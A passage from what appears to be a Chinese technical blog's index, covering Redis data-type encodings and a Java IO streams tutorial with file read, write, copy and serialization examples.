title="底层编码方式"></a>底层编码方式</h4><p>Redis中会根据存储的数据类型不同，选择不同的编码方式，共包含11种不同类型：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8iembds0pj30pw0ce0ud.jpg" alt="image-20221126121318276"></p><h4 id="五种数据类型的底层类型："><a href="#五种数据类型的底层类型：" class="headerlink" title="五种数据类型的底层类型："></a>五种数据类型的底层类型：</h4><table><thead><tr><th align="left"><strong>数据类型</strong></th><th><strong>编码方式</strong></th></tr></thead><tbody><tr><td align="left">OBJ_STRING</td><td>int、embstr、raw</td></tr><tr><td align="left">OBJ_LIST</td><td>LinkedList和ZipList(3.2以前)、QuickList（3.2以后）</td></tr><tr><td align="left">OBJ_SET</td><td>intset、HT</td></tr><tr><td align="left">OBJ_ZSET</td><td>ZipList、HT、SkipList</td></tr><tr><td align="left">OBJ_HASH</td><td>ZipList、HT</td></tr></tbody></table><h2 id="五种数据类型"><a href="#五种数据类型" class="headerlink" title="五种数据类型"></a>五种数据类型</h2><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>我们知道底层是通过SDS结构，但不同的SDS长度会使用不同的编码。</p><p>如果存储的是字符串是整数值，大小在Long_MAX范围内，则会使用INT编码，直接将数据保存在RedisObject的ptr指针位置（刚好8字节），<strong>不再需要SDS了</strong>。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ieqz0q53j30k203jdfx.jpg" alt="image-20221126121746597"></p><p>如果存储的SDS长度小于44字节，则会采用EMBSTR编码，此时object head与SDS是一段连续空间。申请内存时只需要调用一次内存分配函数，效率更高。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8iero6hhaj30us02xmxd.jpg" alt="image-20221126121826644"></p><p>否则用的就是raw编码了，SDS单独占一个内存，RedisObject用指针连接</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8iesl4ctqj30uy081t93.jpg" alt="image-20221126121919607"></p><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><blockquote><p>我们可以自己想一想，底层结构中哪个合适?</p></blockquote><p>List操作需要可以从两端插入或弹出，范围读取。</p><p>SDS是字符串（❎），intSet是完整的内存，支持有序，唯一（❎），Dict无法双端操作（❎）</p><p>ZipList：完整内存，双端操作，范围读取（✅）</p><p>QuickList：LinkedList + ZipList，可以从双端访问，内存占用较低，包含多个ZipList，存储上限高（✅）</p><ul><li>在3.2版本之前，Redis采用ZipList和LinkedList来实现List，当元素数量小于512并且元素大小小于64字节时采用ZipList编码，超过则采用LinkedList编码。</li><li>在3.2版本之后，Redis统一采用QuickList来实现List</li></ul><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>Set需要元素唯一（可判断是否元素存在），不保证有序，求交集，并集，差集，也就是对查询效率要求很高</p><p>我们能想到Java中，利用Map实现Set结构，Value存Null，那在Redis中应该也可以，所以Dict(✅)</p><p>IntSet内部是整数数组，不过可以保证唯一，且有序，二分查询也快。当存储的所有数据都是整数，并且元素数量不超过set-max-intset-entries时，Set会采用IntSet编码，以节省内存，IntSet(✅)</p><h3 id="ZSet"><a href="#ZSet" class="headerlink" title="ZSet"></a>ZSet</h3><p>ZSet也就是SortedSet，其中每一个元素都需要指定一个score值和member值。要求：</p><p>可以根据score值排序，member必须唯一，可以根据member查询分数</p><ol><li>那想到第一个应该是Dict结构，key为member，value为score，可以保证member唯一，✅</li><li>然后有分数的就是SkipList，可以排序，并且可以同时存储score和ele值（member）✅</li><li>当元素数量不多时，HT和SkipList的优势不明显，而且更耗内存。因此zset还会采用ZipList结构来节省内存，不过需要同时满足两个条件：✅<ol><li>元素数量小于zset_max_ziplist_entries，默认值128</li><li>每个元素都小于zset_max_ziplist_value字节，默认值64</li></ol></li></ol><blockquote><p>ziplist本身没有排序功能，而且没有键值对的概念，因此需要有zset通过编码实现：</p></blockquote><ol><li>ZipList是连续内存，因此score和element是紧挨在一起的两个entry， element在前，score在后</li><li>score越小越接近队首，score越大越接近队尾，按照score值升序排列</li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ifcqek5sj30tz06xt96.jpg" alt="image-20221126123840996"></p><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>需求：</p><ol><li>键值存储</li><li>根据键获取值</li><li>键唯一</li></ol><p>我们发现与Zset需求很相似</p><ol><li>zset的键是member，值是score；hash的键和值都是任意值</li><li>zset要根据score排序；hash则无需排序</li></ol><p>因此，Hash底层采用的编码与Zset也基本一致，只需要把排序有关的SkipList去掉即可。也就是剩下ZipList和Dict</p><ul><li><p>Hash结构默认采用ZipList编码，用以节省内存。 ZipList中相邻的两个entry 分别保存field和value ✅</p></li><li><p>当数据量较大时，Hash结构会转为HT编码，也就是Dict，触发条件有两个： ✅</p><ul><li>ZipList中的元素数量超过了hash-max-ziplist-entries（默认512）</li><li>ZipList中的任意entry大小超过了hash-max-ziplist-value（默认64字节）</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO流</title>
      <link href="/2022/11/25/Java/IO%E6%B5%81/"/>
      <url>/2022/11/25/Java/IO%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p>今天面试的时候问了一道IO流的题，鉴于之前在java基础篇的时候学过一遍，后再无使用和复习，就再跟着韩顺平老师的课件复习一遍。</p><h1 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h1><h2 id="IO流是什么？"><a href="#IO流是什么？" class="headerlink" title="IO流是什么？"></a>IO流是什么？</h2><p>当我们使用程序读取或修改本地文件时， 文件是以流的形式加载在内存中的。</p><ol><li>InputStream:输入流，从数据源加载至内存。</li><li>OutputStream:输出流，从存在中加载至目的地。</li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heh5hdrcj30jh045dg2.jpg" alt="image-20220902174637579"></p><h2 id="IO流有哪些分类"><a href="#IO流有哪些分类" class="headerlink" title="IO流有哪些分类"></a>IO流有哪些分类</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heh5td93j30tz0bywh6.jpg" alt="image-20220902174807812"></p><blockquote><p> 输入流，输出流是最宽泛的概念，也是我们上面讲的概念。那为什么还需要分成字节流，字符流，节点流，处理流呢？</p></blockquote><p>字节我们都知道：byte，是一个二进制单位，而我们的文件可以是txt(存储字符的),png(存储图片的),mp3(存储音频的),mp4(存储视频的)，但传输的时候我们都将其转化为二进制，因为计算机只能识别二进制，也就是字节。所以字节流的意思就是说：将该文件以字节为单位进行读取，可以一个字节一个字节读取，或者一段字节数组进行重复读取。这样不管是什么文件都可以进行传输了。</p><p>那为啥还需要字符流呢？这是已因为字节流是直接作用于文件的，而字符流使用了缓冲区，先将数据写入缓冲区进行读写操作，当输出流close或者flush时，才会把内容写入目的地。一般我们在操作文本内容时，使用字符流会更好一些，而图片，视频如果使用字符流，可能导致文件损坏。</p><p>节点流代表的是我们实际操作数据的流，相比包装流会更贴近底层一些，也就是我们使用FileInputStream,FileOutputStream等，而包装流是封装在节点流之上，用来加入缓存，封装接口，进行性能优化等。相当于节点流是mybatis，包装流就是mybatis-plus。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heh68926j30h10g3dgh.jpg" alt="image-20220903100526143"></p><h2 id="具体使用（这里我只引用常用的）："><a href="#具体使用（这里我只引用常用的）：" class="headerlink" title="具体使用（这里我只引用常用的）："></a>具体使用（这里我只引用常用的）：</h2><h3 id="FileInputStream-节点流，字节流"><a href="#FileInputStream-节点流，字节流" class="headerlink" title="FileInputStream(节点流，字节流)"></a>FileInputStream(节点流，字节流)</h3><blockquote><p>请使用 FileInputStream 读取 hello.txt 文件，并将文件内容显示到控制台</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fileInputStream</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">readLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            fileInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> ((readLength = fileInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,readLength));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;哪里出现问题了&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="FileOutputStream-节点流，字节流"><a href="#FileOutputStream-节点流，字节流" class="headerlink" title="FileOutputStream(节点流，字节流)"></a>FileOutputStream(节点流，字节流)</h3><blockquote><p>请使用  FileOutputStream    在 hello.txt 文件，中写入  “hello，world”,   如果文件不存在，会创建<br>文件(注意：前提是目录已经存在.)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fileOutputStream</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">        file.createNewFile();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里构造器如果加true，表示追加模式，如果不写，默认是覆盖原来内容</span></span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="string">&quot;hello，world---&quot;</span>.getBytes();</span><br><span class="line">        fileOutputStream.write(bytes);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>图片文件的拷贝</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fileCopy</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/wallhaven.png&quot;</span>);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/wallhaven_.png&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">readLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> ((readLen = fileInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            fileOutputStream.write(bytes,<span class="number">0</span>,readLen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FileReader-节点流，字符流"><a href="#FileReader-节点流，字符流" class="headerlink" title="FileReader(节点流，字符流)"></a>FileReader(节点流，字符流)</h3><blockquote><p>使用  FileReader   从    story.txt   读取内容，并显示</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fileReader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">readLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>[] chars = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> ((readLen = fileReader.read(chars)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(chars,<span class="number">0</span>,readLen));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        fileReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FileWriter-节点流，字符流"><a href="#FileWriter-节点流，字符流" class="headerlink" title="FileWriter(节点流，字符流)"></a>FileWriter(节点流，字符流)</h3><blockquote><p>使用 FileWriter   将   “风雨之后，定见彩虹”    写入到   note.txt    文件中,    注意细节.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void fileWriter() throws IOException &#123;</span><br><span class="line">    // 使用 FileWriter   将   “风雨之后，定见彩虹”    写入到   note.txt    文件中,    注意细节.</span><br><span class="line">    FileWriter fileWriter = new FileWriter(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;, true);</span><br><span class="line">    try &#123;</span><br><span class="line">        fileWriter.write(&quot;风雨之后，定见彩虹&quot;);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        // 一定要关闭流 ，数据才会写入到文件中，或者使用fileWriter.flush();</span><br><span class="line">        fileWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BufferReader-包装流，字符流"><a href="#BufferReader-包装流，字符流" class="headerlink" title="BufferReader(包装流，字符流)"></a>BufferReader(包装流，字符流)</h3><blockquote><p>使用BufferReader读取文件，并打印到控制台</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void bufferedReader() throws IOException &#123;</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new FileReader(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;));</span><br><span class="line">    String readLen;</span><br><span class="line">    try &#123;</span><br><span class="line">        // readLine() 按照行读取，效率高</span><br><span class="line">        while ((readLen = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(readLen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        throw new RuntimeException(e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        // 这里包装流关闭时，节点流底层自动关闭了</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BufferWriter-包装流，字符流"><a href="#BufferWriter-包装流，字符流" class="headerlink" title="BufferWriter(包装流，字符流)"></a>BufferWriter(包装流，字符流)</h3><blockquote><p>bufferWriter 写 文件</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bufferWriter</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">BufferedWriter</span> <span class="variable">bufferedWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;</span>));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        bufferedWriter.write(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 换行</span></span><br><span class="line">        bufferedWriter.newLine();</span><br><span class="line">        bufferedWriter.write(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        bufferedWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>bufferReader，bufferedWriter 拷贝文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public void fileCopyByBuffered() throws IOException &#123;</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new FileReader(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;));</span><br><span class="line">    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello_.txt&quot;));</span><br><span class="line">    String readLen;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 注意这里的bufferedReader.readLine()为换行符时，默认返回的是空字符，所以导致原本换行的地方，现在直接拼接了</span><br><span class="line">        while ((readLen = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">            if (&quot;&quot;.equals(readLen)) &#123;</span><br><span class="line">                // 这样就能保证正常输出了，还有一点比方说：\n\n\n  实际上中间只空了两行</span><br><span class="line">                readLen+=&quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedWriter.write(readLen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        bufferedWriter.close();</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BufferInputStream-包装流，字节流"><a href="#BufferInputStream-包装流，字节流" class="headerlink" title="BufferInputStream(包装流，字节流)"></a>BufferInputStream(包装流，字节流)</h3><h3 id="BufferOutputStream-包装流，字节流"><a href="#BufferOutputStream-包装流，字节流" class="headerlink" title="BufferOutputStream(包装流，字节流)"></a>BufferOutputStream(包装流，字节流)</h3><blockquote><p>BufferInputStream,BufferOutputStream拷贝文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public void fileCopyByBufferedStream() throws IOException &#123;</span><br><span class="line">    BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/wallhaven.png&quot;));</span><br><span class="line">    BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/wallhaven__.png&quot;));</span><br><span class="line">    byte[] bytes = new byte[1024];</span><br><span class="line">    int readLen = 0;</span><br><span class="line">    try &#123;</span><br><span class="line">        while ((readLen = bufferedInputStream.read(bytes)) != -1) &#123;</span><br><span class="line">            bufferedOutputStream.write(bytes,0,readLen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        bufferedInputStream.close();</span><br><span class="line">        bufferedOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ObjectInputStream-对象流，字节流"><a href="#ObjectInputStream-对象流，字节流" class="headerlink" title="ObjectInputStream(对象流，字节流)"></a>ObjectInputStream(对象流，字节流)</h3><p>对象流就是我们将java对象进行序列化，存储在文件中，并可以通过对象流反序列化回来，要序列化的对象一定需要实现<code>Serializable</code>,其属性也需要实现，基本数据类型会自动变成包装类，而包装类是已经实现了的。</p><blockquote><p>序列化一个dog对象到文件中，并再反序列化回来</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public void objectInputStream() throws IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line">    // FileOutputStream()  如果没有使用追加默认 会直接将文件清空</span><br><span class="line">    ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/dog.dat&quot;));</span><br><span class="line">    try &#123;</span><br><span class="line">        objectOutputStream.writeObject(new dog(&quot;旺财&quot;,123));</span><br><span class="line">        objectOutputStream.writeObject(1);</span><br><span class="line">        System.out.println(&quot;输出成功&quot;);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Thread.sleep(500);</span><br><span class="line"></span><br><span class="line">    // ObjectInputStream 在读取数据文件时候会判断 magic value，version value，来判断文件是否正确，如果不正确会爆出EOP错误</span><br><span class="line">    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/dog.dat&quot;));</span><br><span class="line">    try &#123;</span><br><span class="line">        Object o = objectInputStream.readObject();</span><br><span class="line">        System.out.println((dog)o);</span><br><span class="line">        System.out.println(objectInputStream.readObject());</span><br><span class="line">        System.out.println(&quot;读取成功&quot;);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ObjectOutputStream-对象流，字节流"><a href="#ObjectOutputStream-对象流，字节流" class="headerlink" title="ObjectOutputStream(对象流，字节流)"></a>ObjectOutputStream(对象流，字节流)</h3><h3 id="InputStreamReader-转化流，字节流"><a href="#InputStreamReader-转化流，字节流" class="headerlink" title="InputStreamReader  (转化流，字节流)"></a>InputStreamReader  (转化流，字节流)</h3><blockquote><p>为什么需要转化流？</p></blockquote><p>因为字符编码问题，当我们使用BufferedReader读txt文件时，默认使用Utf-8编码，现在想用其他编码格式，就可以将字节流转为字符流，然后指定编码规则，其实字符流本身底层使用的还是字节流，只是针对字符内容做出了优化。</p><blockquote><p>字节流FileInputStream 包装成字节流InputStreamReader,对文件进行读取(按照 utf-8/gbk 格式),进而在包装成BufferedReader。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public void InputStreamReader() throws IOException &#123;</span><br><span class="line">    // 将字节流FileInputStream 包装成字符流 InputStreamReader，对文件进行读取（utf-8/gbk格式）,进而包装成BufferedReader</span><br><span class="line">    FileInputStream fileInputStream = new FileInputStream(&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;);</span><br><span class="line">    // 底层默认使用的就是UTF-8  ，我们也可以使用gbk等</span><br><span class="line">    InputStreamReader inputStreamReader = new InputStreamReader(fileInputStream, &quot;utf-8&quot;);</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String s = bufferedReader.readLine();</span><br><span class="line">        System.out.println(&quot;读取到的内容=&quot;+s);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        throw new RuntimeException(e);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="OutputStreamWriter-转化流，字节流"><a href="#OutputStreamWriter-转化流，字节流" class="headerlink" title="OutputStreamWriter(转化流，字节流)"></a>OutputStreamWriter(转化流，字节流)</h3><blockquote><p>使用gbk编码输出文本</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">OutputStreamWriter</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt&quot;</span>);</span><br><span class="line">    <span class="type">OutputStreamWriter</span> <span class="variable">outputStreamWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(fileOutputStream, <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">    <span class="type">BufferedWriter</span> <span class="variable">bufferedWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(outputStreamWriter);</span><br><span class="line">    <span class="keyword">try</span> 